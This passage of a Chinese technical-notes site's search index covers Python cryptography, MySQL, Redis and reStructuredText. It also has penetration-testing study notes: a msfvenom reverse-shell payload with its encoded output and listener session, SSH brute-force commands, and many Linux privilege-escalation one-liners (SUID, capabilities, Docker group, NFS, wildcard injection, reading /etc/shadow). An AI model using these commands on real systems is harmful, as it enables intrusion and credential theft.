'gAAAAABYnKzqNxRAbwP6hMMGmB4eIBhiAR2oVG136Dpive8AhNBdtjwKKiOj_Zaxv8e1dHWp1_WpvktTCT5lRnm9ZnBIK4AoMw=='\n\n>>>f.decrypt(token)\nOut[7]: 'Secret message!'\n\n>>>key3 = Fernet(Fernet.generate_key())\n\n>>>f = MultiFernet([key3, key1, key2])\n\n>>>f.decrypt(token)\nOut[10]: 'Secret message!' 参考: https://zhuanlan.zhihu.com/p/25168804","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-cryptography.html","loc":"/yq-docs-rear-end-python-python-three--party-library-cryptography.html"},{"title":"Kali漏洞分析利用","text":"经过 Kali信息收集 收集到的资产 联系人、联系方式 域名和子域名 IP、端口信息 操作系统、应用程序、框架、数据库、版本信息 网站文件（目录扫描） 搜索引擎和网络空间测绘收集到的信息 ... 漏洞数据库 CVE (Common Vulnerabilities & ExposUres ） (通用漏洞共享平台): https://cve.mitre.org/\nhttps://www.cvedetails.com/\nhttps://www.cnvd.org/cn/\nhttps://nox.qianxin.com/vulnerability 国内的: # 国家\nhttps://www.cnvd.org.cn/\n\n# 奇安信\nhttps://ti.qianxin.com/\nhttps://ti.qianxin.com/vulnerability/ 一般漏洞编号: CVE + 年份 + 编号 如: CVE-2004-1137 漏洞利用工具集 POC: Proof Of Concept(观念验证) EXP: Exploit 利用(漏洞利用) 可用漏洞利用网站: https://www.exploit-db.com/ 相关指令: msfconsole 的 searchsploit pocsuite 注解 如果自己要做一个漏洞搜集的汇总网站, 可以github搜索: pocsuite 提供了一个基础的框架 漏洞扫描工具 商业漏洞扫描工具 Appscan Nessus OpenVAS ... 免费的 goby (红队是收费版) Burp https://github.com/k8gege/Ladon 国产的 注解 一般不允许使用漏洞扫描工具扫描线上服务,\n因为会建立大量请求, 说不定就直接把你封了(同ip大量请求) 一般就内部未上线的用下 msf反弹连接 msf使用见 msfconsole 实例 生成payload, 指令详见 msfvenom ,\n生成一个python版本的payload: # msfvenom -p python/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.py\n# LHOST=攻击机IP    一般为自己本机ip(本机就是攻击机)\n# LPORT=攻击机端口  随便\nmsfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.186.133 LPORT=8889 -f raw -o payload.py 攻击机生成payload 攻击机生成: ┌──(kali㉿kali)-[~/test]\n└─$ msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.186.133 LPORT=8889 -f raw -o payload.py\n/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::NAME\n...\n\n┌──(kali㉿kali)-[~/test]\n└─$\n\n┌──(kali㉿kali)-[~/test]\n└─$ cat payload.py\nexec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCx6bGliLGJhc2U2NCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzE5Mi4xNjguMTg2LjEzMycsODg4OSkpCgkJYnJlYWsKCWV4Y2VwdDoKCQl0aW1lLnNsZWVwKDUpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoemxpYi5kZWNvbXByZXNzKGJhc2U2NC5iNjRkZWNvZGUoZCkpLHsncyc6c30pCg==')[0])) 将payload传递到靶机 利用漏洞将生成的 payload.py 上传到目标机器 攻击机使用msf监听 指令: # 进入msf控制台\nmsfconsole\n\n# 使用监听模块\nuse exploit/multi/handler\n\n# 设置payload类型 注意跟上面生成时使用的模块要一致\nset payload python/meterpreter/reverse_tcp\nset lhost 攻击机IP\nset lport 攻击机端口\nexploit 实例: msf6 > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) > set payload python/meterpreter/reverse_tcp\npayload => python/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) > set lhost 192.168.186.133\nlhost => 192.168.186.133\nmsf6 exploit(multi/handler) > set lport 8889\nlport => 8889\nmsf6 exploit(multi/handler) >\nmsf6 exploit(multi/handler) > exploit\n\n[*] Started reverse TCP handler on 192.168.186.133:8889 当靶机触发payload时候: [*] Sending stage (40168 bytes) to 192.168.186.129\n[*] Meterpreter session 1 opened (192.168.186.133:8889 -> 192.168.186.129:53686) at 2024-02-25 21:56:55 +0800\n\nmeterpreter > 即获取到 192.168.186.129 的反弹shell 执行个 dir 指令: meterpreter > dir\nListing: D:\\Project\\DevTools\\phpStudy_64\\phpstudy_pro\\WWW\\test\n==============================================================\n\nMode              Size  Type  Last modified            Name\n----              ----  ----  -------------            ----\n100666/rw-rw-rw-  503   fil   2024-02-25 21:53:44 +08  pl.py\n                              00\n\nmeterpreter > Burp Suite爆破web密码 bp拦截成功后将其转入 Intruder 然后选择 Sniper (狙击手) 模式即可 设置好 Payload 后点击 Start attack 开始攻击 效果 可以看出当密码正确时候, 响应长度可以作为判断是否成功标志(还是得看情况) Hydra爆破Linux密码 相关指令: hydra medusa msfconsole 三种工具: hydra -L username.txt -P password.txt 192.168.142.66 ssh\n\n\nmedusa -M ssh -h 192.168.142.66 -u root -P password.txt\n\n\nmsfconsole\nuse auxiliary/scanner/ssh/ssh_login\nset RHOSTS 192.168.142.66\nset PASS_FILE password.txt\nset USER_FILE username.txt\nexploit sqlmap渗透 工具 sqlmap","tags":"安全","url":"/yq-docs-Safety-Study-record-Kali-vulnerability-analysis-and-utilization.html","loc":"/yq-docs-Safety-Study-record-Kali-vulnerability-analysis-and-utilization.html"},{"title":"提权总结","text":"sudo/suid提权 suid涉及到linux的s权限位: linux下文件权限位 sudo可以其他用户执行, 可见: sudo 一般来说, 就是利用某些具有s位权限的指令, 获取到root的权限 查找具有suid权限文件: find / -perm -u=s 2>/dev/null 查看哪些命令能被sudo: sudo -l 接下来列出具体可用于提权的一些指令 nmap nmap: echo \"os.execute('/bin/bash')\" > ./shell\nnmap --script=shell suid-find find命令自带-exec参数, 可以执行命令, 若find有suid权限, 那么使用exec相当于直接提权到root: # find / -exec command\nfind /path -exec {} \\; suid-vim vim有了suid就可以任意文件读取了 同时也可以输入: :shell 来获取root shell bash 开启一个新shell, suid的话自然是开启root shell: bash -p less/more 和vim差不多, 任意文件读取, 同时也可以输入: !command 进行提权到root exim exim在特定版本下会有suid提权 这里没懂 利用环境变量 如果我们找到一个suid权限的程序, 但是我们无法完成suid提权, 就可以试试搭配环境变量进行提权. 这个提权方法的思想是: 文件具有 suid 权限 文件内容有 system 函数调用, 且此调用未指定路径 用户有权修改自己环境变量 就可以通过劫持system函数里调用的脚本文件,\n使其指向我们环境变量里自行创建的一个同名脚本文件,\n那么自行创建的同名脚本文件就能以root权限运行了,\n如果这个脚本文件里的命令是/bin/bash, 那么就相当于提权了. 例 对于被攻击者, 创建一个具有以上条件的文件: ┌──(root㉿3675b5ebb8ce)-[~]\n└─# cat demo.c\n# include <unistd.h>\n# include <stdlib.h>\n\nvoid main (){\n  setuid(0);\n  setgid(0);\n\n  system(\"ps\");\n}\n\n\n┌──(root㉿3675b5ebb8ce)-[~]\n└─# gcc demo.c -o do_ps\n\n┌──(root㉿3675b5ebb8ce)-[~]\n└─# chmod u+s do_ps\n\n┌──(root㉿3675b5ebb8ce)-[~]\n└─# ls -lh do_ps\n-rwsr-xr-x 1 root root 69K Mar  4 14:44 do_ps\n\n┌──(root㉿3675b5ebb8ce)-[~]\n└─# ./do_ps\n  PID TTY          TIME CMD\n    9 pts/1    00:00:00 bash\n  31 pts/1    00:00:00 do_ps\n  32 pts/1    00:00:00 sh\n  33 pts/1    00:00:00 ps\n\n┌──(root㉿3675b5ebb8ce)-[~]\n└─# mv do_ps /home/yanque/test/ 对于攻击者而言: ┌──(yanque㉿3675b5ebb8ce)-[~]\n└─$ find / -perm -u=s -type f 2>/dev/null\n/home/yanque/test/do_ps\n\n┌──(yanque㉿3675b5ebb8ce)-[~]\n└─$ test/do_ps\n  PID TTY          TIME CMD\n    9 pts/1    00:00:00 bash\n  51 pts/1    00:00:00 su\n  67 pts/1    00:00:00 do_ps\n  68 pts/1    00:00:00 sh\n  69 pts/1    00:00:00 ps 发现返回了ps命令的结果, 可此猜测这个文件内部 有 system(\"ps\"); 类似这样的代码. 测试... 本地测试的时候 export 一直失败... ┌──(yanque㉿3675b5ebb8ce)-[~/test]\n└─$ export $PATH=\"/home/yanque/test:$PATH\"\n-bash: export: `/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games=/home/yanque/test:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games': not a valid identifier 遂放弃 然后进行以下尝试: cd /tmp\necho \"/bin/bash\" > ps\nexport $PATH=/tmp:$PATH        # 需要修改自身环境变量的权限, 但基本上都有这个权限\nchmod 777 ./ps                 # 没这条命令会导致提权失败\ncd ~\ntest/do_ps                     # 提权成功 rbash绕过 rbash, 是出于安全性考虑的一个功能受限的bash, 他的限制性可能会有如下. cd 切换目录 含有斜杠 / 的命令, 譬如 /bin/sh 设置 PATH ENV 等环境变量 使用 > < 进行重定向 binary 的运行.\n通常 root 用户会手动创建 /bin/binary_file -> /home/rbash_user/bin/binary_file 的软链接,\n限制性地提供部分 binary_file 给 rbash_user 使用 在 bash 下 echo $SHELL, 可以获取当前环境是否是 rbash. 使用scp发送自己的bash进行绕过: # 发送到当前用户的环境变量路径下\nscp /usr/bin/bash user@ip:/home/test/bash\n\n# 执行\nbash -p 同时这里也可以想到, 很多命令如man,git config help,more,less,vim,vi,ftp,gdb等,\n都有自己的shell, 只需在他们各自的shell中执行/bin/sh即可进入bash界面, 一般都是在shell键入: !/bin/sh 来 bypass rbash vim 如对于vim, 可执行以下命令绕过: :set shell=/bin/bash\n:shell find 对于find来说: find -exec /bin/bash \\; cp 对于cp: # 查看当前用户环境变量\nexport -p\n\n# 然后使用cp 将 /usr/bin 下文件复制过来即可 编程语言绕过 python: python -c \"import os;os.system('/bin/bash')\" php: # php -a 进入php shell\nexec(\"/bin/bash\"); perl: perl -e 'exec \"/bin/sh\";' ruby: ruby -e 'exec \"/bin/bash\"' ssh 对于ssh, 通过ssh链接当前IP的当前用户并启动/bin/bash: ssh username@Ip -t \"/bin/bash\" 内核提权 先查看系统内核版本: uname -a 然后找exp打 passwd和shadow 明文密码 /etc/passwd 默认所有用户可读, 但只有root可写.\n/etc/passwd里的用户口令往往以x代替, 其加密后的密码会存入/etc/shadow里面, /etc/shadow默认只有root可读. 但是有小概率情况, 明文密码就直接出现在/etc/passwd了, 如果有这个情况且root密码暴露在了passwd里, 那么就可以轻而易举提权了 passwd 可写 如果/etc/passwd 我们当前用户可写, 可以直接把root的密码改成一个明文密码, 从而达到提权目的 爆破shadow 如果/etc/shadow 可读, 我们可以用hashcat或者john暴力破解shadow文件 计划任务(crontab) 文件重写 计划任务由crontab管理, 非root用户是无法列出root用户的计划任务的, 但我们可以列出/etc的系统任务, 系统任务默认是root权限运行的: ls -l /etc/cron* 如果我们有幸有权限能更改其中一个任务指定的脚本, 我们就可以往脚本里添加如反弹shell等指令, 从而提权 环境变量劫持 查看定时任务 发现定义了诸多环境变量, 如果其任务有未指定绝对路径的指令, 如: 17 *    * * *   root    shell.sh 而且我们在其环境变量路径中可以进行写入操作, 那么我们可以通过写入环境变量的靠前路径一个同名恶意文件从而导致环境变量劫持 比如我们在/sbin 写入一个 反弹shell功能的shell.sh, 那么就可以造成提权 密码查找 这个提权技术说白了, 就是去到处翻密码 可以通过以下命令, 指定关键字, 在所有文件中搜索内容中有关键字的文件: grep --color=auto -rnw '/' -ie \"PASSWORD\" --color=always 2> /dev/null\nfind . -type f -exec grep -i -I \"PASSWORD\" {} /dev/null \\; 查找十分钟内更改过的文件: find / -mmin -10 2>/dev/null | grep -Ev \"&#94;/proc\"  (不显示&#94;/proc文件或文件夹) capabilities capabilities 是linux2.2后出现的产物, 它的出现一定程度上弥补了suid这种粗糙的权限管理机制,\n但是capabilities 自身也有造成提权的安全隐患 简介 capabilities 把root的权限细分了, 可以分别启用或者禁用. euid 见 linux下文件权限位 下 文件权限的s位和t位的理解 小节 在进行特权操作的时候, 如果 euid 不是root,\n那么系统就会检查是否具有执行特权操作的对应capabilities , 并以此为凭据决定特权操作是否能被执行. 如下是一些常见的特权操作及其对应capabilities 改变文件的所属者(chown()) CAP_CHOWN 向进程发送信号(kill() signal()) CAP_KILL 改变进程的uid(setuid() setreuid() setresuid()等) CAP_SETUID trace进程(ptrace()) CAP_SYS_PTRACE 设置系统时间(settimeofday() stime()等) CAP_SYS_TIME 忽略文件读及目录搜索的DAC访问限制 CAP_DAC_READ_SEARCH 关于capabilities的管理工具有如下: getcap setcap capsh filecap getcap getcap 用于查询capabilities, setcap用于设置capabilities,\ncapsh用于查当前shell进程的capabilities, filecap既能设置又能查询. 我们可以通过以下指令搜索设置了capabilities的可执行文件: getcap -r / 2>/dev/null 实操 - 通过 cap_setuid cap_setuid 可以设置当前用户的euid, 我们可以通过此选项来进行一些提权. 以python为例: ./python3.8 = cap_setuid+eip 现python3.8 有cap_setuid权限, 那么我们可以用以下指令进行提权: python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")' 类似的有很多 perl: perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";' gdb: gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit php: php -r \"posix_setuid(0); system('/bin/sh');\" python: python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")' rvim (需要支持python3模块) rvim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")' vim (需要支持python3模块, vim --version 查询, 是否支持py3) vim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")' 实操 - 通过 CAP_DAC_READ_SEARCH cap_dac_read_search 可以绕过文件的读权限检查以及目录的读/执行权限的检查. 利用此特性我们可以读取系统中的敏感信息. 如果tar有此权限, 我们可以通过此来查看敏感文件内容: tar cvf shadow.tar /etc/shadow  //创建压缩文件\n\ntar -xvf shadow.tar  //解压缩\n\ncd etc  //进入解压缩的目录\n\nchmod +r shadow  //赋予读权限\n\ncat shadow | grep root  //查看shadow文件的内容 Docker Docker用户组提权 如果我们拿到了一个Docker用户组的用户权限, 那么我们可以很轻松地完成提权 首先我们执行如下命令: docker run -v /:/mnt --rm -it crf_web1 chroot /mnt sh 然后在其中的/etc/passwd中写入一个root权限用户（这里直接无密码了） root2::0:0::/root:/bin/bash 然后退出来, 直接尝试: su root2 NFS NFS 是一个用来共享目录的东西, 但若配置权限不当则会引发安全问题 no_root_squash 我们 cat /etc/exports 如果有 no_root_squash 字样,\n则说明root用户会对共享目录拥有至高的权限控制, 就像是对本机的目录操作一样. 也就是说, 任何机器的root在此目录上都有最高权限. 我们在获得一台机器的root权限后, 可以通过nfs在另一台低权限机器上实现提权: mkdir /tmp/nfs\nmount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs  # 将本机上的/tmp/nfs 挂载到共享目录\ncp /bin/bash /tmp/nfs/bash\nchmod u+s /tmp/nfs/bash  设置共享目录上bash的suid 回到低权限机, 执行 /tmp/bash  完成提权 通配符提权 利用通配符实现Linux本地提权 一种古老的UNIX黑客技术—通配符注入 通配符是一个字符或一组字符, 可以用来替换某些范围/类别的字符. 在执行任何其他操作之前, 通配符首先要经过shell进行解释. 一些常见的通配符: *     星号可以与文件名中的任意数量的字符匹配, 包括0个字符.\n?     问号用于匹配任意单个字符.\n[]   括号内包括一组字符, 其中任何一个字符都可以匹配该位置上的单个字符.\n–     []中的连字符表示字符范围.\n~     单词开头的波浪符表示当前用户的主目录的名称. 如果该字符后面是另一个用户的登录名, 则表示该用户的主目录. 例1-通过Chown劫持文件所有者 前置, root想给多用户提供一个公共的目录: ┌──(root㉿3675b5ebb8ce)-[~]\n└─# mkdir /tmp/common\n\n┌──(root㉿3675b5ebb8ce)-[~]\n└─# chmod 777 /tmp/common 用户 yanque 在其下创建了三个文件: ┌──(yanque㉿3675b5ebb8ce)-[/tmp/common]\n└─$ touch file1.php file2.php file3.php\n\n┌──(yanque㉿3675b5ebb8ce)-[/tmp/common]\n└─$ ls -lh\ntotal 0\n-rw-r--r-- 1 yanque yanque 0 Mar  5 15:59 file1.php\n-rw-r--r-- 1 yanque yanque 0 Mar  5 15:59 file2.php\n-rw-r--r-- 1 yanque yanque 0 Mar  5 15:59 file3.php 攻击者 yq 发现了这个目录下的文件都是 yanque 的, 猜测root用户可能会对其使用通配符的方式进行授权操作, 于是做出以下操作: ┌──(yq㉿3675b5ebb8ce)-[/tmp/common]\n└─$ echo >--reference=my.php\n\n┌──(yq㉿3675b5ebb8ce)-[/tmp/common]\n└─$ echo >my.php\n\n┌──(yq㉿3675b5ebb8ce)-[/tmp/common]\n└─$ ls -lh\ntotal 8.0K\n-rw-r--r-- 1 yq     yq     1 Mar  5 16:04 '--reference=my.php'\n-rw-r--r-- 1 yanque yanque 0 Mar  5 15:59  file1.php\n-rw-r--r-- 1 yanque yanque 0 Mar  5 15:59  file2.php\n-rw-r--r-- 1 yanque yanque 0 Mar  5 15:59  file3.php\n-rw-r--r-- 1 yq     yq     1 Mar  5 16:04  my.php 技巧 猜测root可能会执行: cd /tmp/common && chown -R yanque:yanque *.php 企图让实际执行指令变为: chown yanque:yanque /tmp/common/* --reference=my.php root因为某些不知名的原因进行了授权操作: ┌──(root㉿3675b5ebb8ce)-[/]\n└─# cd /tmp/common/\n\n┌──(root㉿3675b5ebb8ce)-[/tmp/common]\n└─# chown -R yanque:yanque *.php\nchown: cannot access 'yanque:yanque': No such file or directory\n\n┌──(root㉿3675b5ebb8ce)-[/tmp/common]\n└─# ls -lh\ntotal 8.0K\n-rw-r--r-- 1 yq yq 1 Mar  5 16:04 '--reference=my.php'\n-rw-r--r-- 1 yq yq 0 Mar  5 15:59  file1.php\n-rw-r--r-- 1 yq yq 0 Mar  5 15:59  file2.php\n-rw-r--r-- 1 yq yq 0 Mar  5 15:59  file3.php\n-rw-r--r-- 1 yq yq 1 Mar  5 16:04  my.php 权限变成了yq的. 例2-通过tar投送漏洞利用代码","tags":"安全","url":"/yq-docs-Safety-Summary.html","loc":"/yq-docs-Safety-Summary.html"},{"title":"masscan","text":"与 nmap 类似,\n信息获取的准确度低一点, 速度会快一点.","tags":"安全","url":"/yq-docs-Safety-kali-Kali-penetration-special-instruction-Masscan.html","loc":"/yq-docs-Safety-kali-Kali-penetration-special-instruction-Masscan.html"},{"title":"数据类型VARCHAR和CHAR","text":"固定长度 & 可变长度 VARCHAR VARCHAR类型用于存储 可变长度 字符串，是最常见的字符串数据类型。\n它比固定长度类型更节省空间，因为它仅使用必要的空间(根据实际字符串的长度改变存储空间)。 有一种情况例外，如果MySQL表使用ROW_FORMAT=FIXED创建的话，每一行都会使用定长存储。 CHAR CHAR类型用于存储固定长度字符串: MySQL总是根据定义的字符串长度分配足够的空间。\n当存储CHAR值时，MySQL会删除字符串中的末尾空格\n(在MySQL 4.1和更老版本中VARCHAR 也是这样实现的 ——\n也就是说这些版本中CHAR和VARCHAR在逻辑上是一样的，区别只是在存储格式上)。 同时，CHAR值会根据需要采用空格进行剩余空间填充，以方便比较和检索。\n但正因为其长度固定，所以会占据多余的空间，也是一种空间换时间的策略； 存储方式 VARCHAR VARCHAR需要使用1或2个额外字节记录字符串的长度:\n如果列的最大长度小于或等于255字节，则只使用1个字节表示，否则使用2个字节。\n假设采用latinl字符集，一个VARCHAR(10)的列需要11个字节的存储空间。\nVARCHAR(1000)的列则需要1002 个字节，因为需要2个字节存储长度信息。 VARCHAR节省了存储空间，所以对性能也有帮助。\n但是，由于行是变长的，在UPDATE时可能使行变得比原来更长，这就导致需要做额外的工作。\n如果一个行占用的空间增长，并且在页内没有更多的空间可以存储，\n在这种情况下，不同的存储引擎的处理方式是不一样的。\n例如，MylSAM会将行拆成不同的片段存储，InnoDB则需要分裂页来使行可以放进页内。 CHAR CHAR适合存储很短或长度近似的字符串。\n例如，CHAR非常适合存储密码的MD5值，因为这是一个定长的值。\n对于经常变更的数据，CHAR也比VARCHAR更好，因为定长的CHAR类型不容易产生碎片。 对于非常短的列，CHAR比VARCHAR在存储空间上也更有效率。\n例如用CHAR(1)来存储只有Y和N的值，如果采用单字节字符集只需要一个字节，\n但是VARCHAR(1)却需要两个字节，因为还有一个记录长度的额外字节。 存储容量 CHAR 对于char类型来说，最多只能存放的字符个数为255，和编码无关，任何编码最大容量都是255。 VARCHAR MySQL行默认最大65535字节，是所有列共享（相加）的，所以VARCHAR的最大值受此限制。 表中只有单列字段情况下，varchar一般最多能存放(65535 - 3)个字节，\nvarchar的最大有效长度通过最大行数据长度和使用的字符集来确定，\n通常的最大长度是65532个字符（当字符串中的字符都只占1个字节时，能达到65532个字符）； 计算为什么是65532个字符？ 算法如下（有余数时向下取整）: 最大长度(字符数) = （行存储最大字节数 - NULL标识列占用字节数 - 长度标识字节数） / 字符集单字符最大字节数 NULL标识列占用字节数：允许NULL时，占一字节 长度标识字节数：记录长度的标识，长度小于等于255（28）时，占1字节；小于65535时（216）,占2字节 VARCHAR类型在4.1和5.0版本发生了很大的变化，使得情况更加复杂。\n从MySQL 4.1开始，每个字符串列可以定义自己的字符集和排序规则。这些东西会很大程度上影响性能。 4.0版本及以下，MySQL中varchar长度是按字节展示，如varchar(20)，指的是20字节； 5.0版本及以上，MySQL中varchar长度是按字符展示。如varchar(20)，指的是20字符。 当然，行总长度还是65535字节，而字符和字节的换算，则与编码方式有关，不同的字符所占的字节是不同的。编码划分如下： GBK编码 一个英文字符占一个字节，中文2字节，单字符最大可占用2个字节。 UTF-8编码 一个英文字符占一个字节，中文3字节，单字符最大可占用3个字节。 utf8mb4编码 一个英文字符占一个字节，中文3字节，单字符最大占4个字节（如emoji表情4字节）。 假设当前还有6字节可以存放字符，按单字符占用最大字节数来算，可以存放3个GBK、或2个utf8、或1个utf8mb4。 思考：既然VARCHAR长度可变，那我要不要定到最大? 没错，相信你已经有答案了，别这么干！ 就像使用VARCHAR(5)和VARCHAR(200)存储 '陈哈哈'的磁盘空间开销是一样的。\n那么使用更短的列有什么优势呢？ 事实证明有很大的优势。\n更长的列会消耗更多的内存，因为MySQL通常会分配固定大小的内存块来保存内部值。 当然，在没拿到存储引擎存储的数据之前，\n并不会知道我这一行拿出来的数据到底有多长，可能长度只有1，可能长度是500，那怎么办呢？\n那就只能先把最大空间分配好了，避免放不下的问题发生，这样实际上对于真实数据较短的varchar确实会造成空间的浪费。 举例：我向数据类型为：varchar（1000）的列插入了1024行数据，\n但是每个只存一个字符，那么这1024行真实数据量其实只有1K，\n但是我却需要约1M的内存去适应他。所以最好的策略是只分配真正需要的空间。 注解 与 CHAR 和 VARCHAR 类似的类型还有 BINARY 和 VARBINARY, 它们存储的是二进制字符串.\n二进制字符串跟常规字符串非常相似，但是二进制字符串存储的是字节码而不是字符。\n填充也不一样: MySQL填充BINARY采用的是 \\0 (零字节)而不是空格，在检索时也不会去掉填充值。 当需要存储二进制数据，并且希望MySQL使用字节码而不是字符进行比较时，这些类型是非常有用的。\n二进制比较的优势并不仅仅体现在大小写敏感上。\nMySQL比较BINARY字符串时，每次按一个字节，并且根据该字节的数值进行比较。\n因此，二进制比 较比字符比较简单很多，所以也就更快。","tags":"数据库","url":"/yq-docs-database-mysql-Conceptual-foundation-Data-type-Varchar-and-Char.html","loc":"/yq-docs-database-mysql-Conceptual-foundation-Data-type-Varchar-and-Char.html"},{"title":"函数API","text":"数值计算 format(num, n) 格式化为string，format($num, $n)， 四舍五入保留小数点后 n 位，\n并格式化用逗号隔开（每三位一个逗号）: select format(1000.1254);\n# 1,000.13 round(num, n) 直接四舍五入，round($num, $n)，四舍五入保留 n 位小数 truncate(num, n) 截取数字的小数点后几位 truncate($num, $n)，不四舍五入: select truncate(100.1234, 2) as '1';\n\n# 100.12\n# 截取小数点后两位 convert(num, ...) 转型，会四舍五入: select convert(1478568.2457, DECIMAL(10,2));\n\n# 1478568.25\n# DECIMAL(10,2) 表示转换为 DECIMAL, 十进制, 保留2位 ceiling(num, n) 取整，个位加一: select CEILING(1478568.2457);   直接取整，个位+1\n# 1478569 floor(n) 向下取整: select FLOOR(1478568.2457);\n# 1478568 rand([n]) 返回随机数, 0~1之间 可设置随机种子参数, 保证结果一致 random() 随机数 字符串拼接 cancat(a, b, c) 将abc拼起来 substr(data_str, start, length) 截取字符串 data_str: str 需要截取的字符串 start: int 开始截取的下标(包含) length: int 从起始位置的长度, 默认到结尾 mid 效果等价于substr left(data_str, length) 从左边开始截取字符串指定长度 ascii(data_str) 获取ascii码, 字符串则获取首字母的ascii码 ord(data_str) 效果等价于ascii group_concat group_by 的时候, 如果有一对多的情况, 5.7 之后的mysql会报错. 使用 group_concat(分组依据的字段名) 可以将多的情况拼接起来. updatexml(XML, xpath_str, new_value) ... extractvalue(XML, xpath_str) ... hex(char) 查看字符的十六进制","tags":"数据库","url":"/yq-docs-database-mysql-Conceptual-foundation-Function-API.html","loc":"/yq-docs-database-mysql-Conceptual-foundation-Function-API.html"},{"title":"底层实现","text":"基于epoll, 多路复用 I/O多路复用底层主要用的Linux 内核函数 （select, poll, epoll）来实现，\nwindows不支持epoll实现，windows底层是基于winsock2的 select函数实现的（不开源） Linux下可参考 IO模型 底层数据结构 整体看是大的全局hash表(k-v) 但是对于value来说, 有不同情况.\nvalue常见支持类型: String List (比如消息队列) Set (比如关注列表) Hash (复杂最想存储) Zset（有序集合）SortSet (比如排行榜) String 简单动态字符串 能转整数的, 用int 小于等于44字节的, 用 \"embstr\" 大于44字节, 用 \"raw\" 如果要查看底层数据存储: object encoding $key Hash hash表, 压缩列表 List 压缩列表(ziplist), 双向链表 Set hash表, 整数数组 ZSet 压缩列表, 跳表(skiplist) 可能会在存储时候, 切换数据结构 跳表(skiplist)优化 对于每两个元素, 取第一个向上提取一层(建立冗余索引),\n类似于B+树 提高查找性能","tags":"数据库","url":"/yq-docs-database-redis-Underlying-implementation.html","loc":"/yq-docs-database-redis-Underlying-implementation.html"},{"title":"Admonitions","text":"提示信息 Specific Admonitions 支持以下类型: attention caution danger error hint important note tip warning 如使用tip, 源码: .. tip::\n  this is a tip msg 效果 技巧 this is a tip msg Generic Admonition 与上区别更像是支持自定义警告标题 支持的类型: admonition 举例, 源码: .. admonition:: And, by the way...\n\n  You can make up your own admonition too. 效果 And, by the way... You can make up your own admonition too.","tags":"文档","url":"/yq-docs-document-RST-mark-language-DOC-grammar-module-Admonitions.html","loc":"/yq-docs-document-RST-mark-language-DOC-grammar-module-Admonitions.html"},{"title":"body-elements","text":"可以理解为html的body 参考: docutils文档 -> body-elements topic 可以理解为自然小节, 能较好控制样式效果 源码: .. topic:: Topic Title\n\n  Subsequent indented lines comprise\n  the body of the topic, and are\n  interpreted as body elements. 效果 Topic Title Subsequent indented lines comprise\nthe body of the topic, and are\ninterpreted as body elements. sidebar 支持的选项 subtitle: text 副标题, 可选 源码: .. sidebar:: sidebar title\n  :subtitle: sidebar sub Title\n\n  this is a sidebar ... 效果 (在右边, 屏幕侧边) sidebar title sidebar sub Title this is a sidebar ... line-block 一个保留原有缩进的段落, 不建议使用, 建议直接使用竖线 用例说明, 源码: .. line-block::\n\n  早, 吃早饭\n  中\n    吃吃吃吃吃吃吃吃吃吃\n  晚\n    面条面条面条面条面条面条 效果 早, 吃早饭 中 吃吃吃吃吃吃吃吃吃吃 晚 面条面条面条面条面条面条 code 支持的命令选项: number-lines: [int] 是否展示行号, 值为起始行号, 默认为1 math 显示数学公式, 前提需要格式支持 epigraph 名言警句, 引用诗歌等 用例, 源码: .. epigraph::\n\n  No matter where you go, there you are.\n  (译: 无论你去哪里，你都在那里)。\n\n  -- Buckaroo Banzai 效果 No matter where you go, there you are.\n(译: 无论你去哪里，你都在那里)。 —Buckaroo Banzai compound \"复合\"指令用于创建复合段落，它是包含多个物理正文元素(如简单段落、文字块、表格、列表等)的单个逻辑段落，而不是直接包含文本和内联元素。 例如, 源码: .. compound::\n\n  如果要查看当前目录下所有文件, 可以使用ls命令::\n\n    ls ./\n\n  某些无权限的文件可能无法访问, 这时需要给予相应的权限 效果 如果要查看当前目录下所有文件, 可以使用ls命令: ls ./ 某些无权限的文件可能无法访问, 这时需要给予相应的权限 container 注意紧跟着的相当于类属性(相当于HTML的CLASS属性), 具体的效果需要用户自定义, 具体怎么自定义暂时没从官方文档看到, 难不成是自定义CSS ? 比如以下的custom: .. container:: custom\n\n  本段可以以自定义方式呈现。","tags":"文档","url":"/yq-docs-document-RST-mark-language-DOC-grammar-module-Body-Elements.html","loc":"/yq-docs-document-RST-mark-language-DOC-grammar-module-Body-Elements.html"},{"title":"Directives for Substitution Definitions","text":"replace 用于替换上下文文本. 源码: .. |奥斯| replace:: 奥斯特洛夫斯基\n\n|奥斯| 说过: 钢铁是我教你们练成的. 开个玩笑. 效果 奥斯特洛夫斯基 说过: 钢铁是我教你们练成的. 开个玩笑. 另外, 由于reStructuredText不支持嵌套内联标记，因此创建带有样式文本的引用的唯一方法是使用\"替换\"指令的替换.\n例如: I recommend you try Python, the best language around . 对应源码: I recommend you try |Python|_.\n\n.. |Python| replace:: 